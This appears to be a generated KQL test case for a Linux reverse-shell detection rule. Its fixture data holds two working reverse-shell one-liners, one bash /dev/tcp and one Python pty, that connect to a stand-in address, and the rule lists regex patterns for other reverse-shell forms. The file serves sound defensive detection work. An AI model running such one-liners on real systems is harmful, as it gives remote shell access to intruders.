// Test: linux-reverse-shell
// Rule: Reverse shell command line on Linux (detections/linux-reverse-shell.yaml)
// A bash /dev/tcp shell and a Python pty shell fire; a netcat port check doesn't.
// Generated by tools/build_tests.py from tests/cases/linux-reverse-shell.yaml. Do not edit by hand.
let Test_linux_reverse_shell = () {
let DeviceProcessEvents = datatable(AgoSeconds:long, DeviceName:string, AccountName:string, FileName:string, FolderPath:string, ProcessCommandLine:string, ProcessVersionInfoOriginalFileName:string, SHA256:string, InitiatingProcessFileName:string, InitiatingProcessCommandLine:string, InitiatingProcessParentFileName:string) [
    600, "lnx-app-01", "tomcat", "bash", "", "bash -c 'bash -i >& /dev/tcp/198.51.100.9/4444 0>&1'", "", "", "java", "", "",
    600, "lnx-app-02", "www-data", "python3", "", "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"198.51.100.9\",443));os.dup2(s.fileno(),0);import pty;pty.spawn(\"/bin/sh\")'", "", "", "php-fpm", "", "",
    600, "lnx-ops-01", "ops", "nc", "", "nc -zv db01 5432", "", "", "bash", "", ""
]
| extend TimeGenerated = now() - AgoSeconds * 1s
| project-away AgoSeconds;
let RuleResults = () {
DeviceProcessEvents
| where TimeGenerated > ago(1h)
| where ProcessCommandLine matches regex @"/dev/(tcp|udp)/[\w\.\-]+/\d+"
    or ProcessCommandLine matches regex @"\b(nc|ncat|netcat|nc\.traditional)\b.*\s-(e|c)\s+\S*(sh|bash)\b"
    or ProcessCommandLine matches regex @"\bncat\b.*--(exec|sh-exec)\b"
    or ProcessCommandLine matches regex @"(?i)\bsocat\b.*\bexec:"
    or ProcessCommandLine matches regex @"mkfifo\s+\S+.*\|\s*(nc|ncat|netcat|/bin/(ba)?sh)\b"
    or ProcessCommandLine matches regex @"python[23]?(\.\d+)?\s+-c\s+.*socket.*(pty\.spawn|os\.dup2|subprocess)"
    or ProcessCommandLine matches regex @"perl\s+-e\s+.*socket.*exec"
    or ProcessCommandLine matches regex @"php\s+-r\s+.*fsockopen"
    or ProcessCommandLine matches regex @"ruby\s+-rsocket"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
};
RuleResults()
| summarize Rows = count(), Include1 = countif(tostring(DeviceName) == "lnx-app-01"), Include2 = countif(tostring(DeviceName) == "lnx-app-02"), Exclude1 = countif(tostring(DeviceName) == "lnx-ops-01")
| extend Test = "linux-reverse-shell", Expected = "2 row(s); 2 must appear; 1 must not"
| extend Result = iff(Rows == 2 and Include1 >= 1 and Include2 >= 1 and Exclude1 == 0, "PASS", "FAIL")
| project Test, Result, Rows, Expected
};
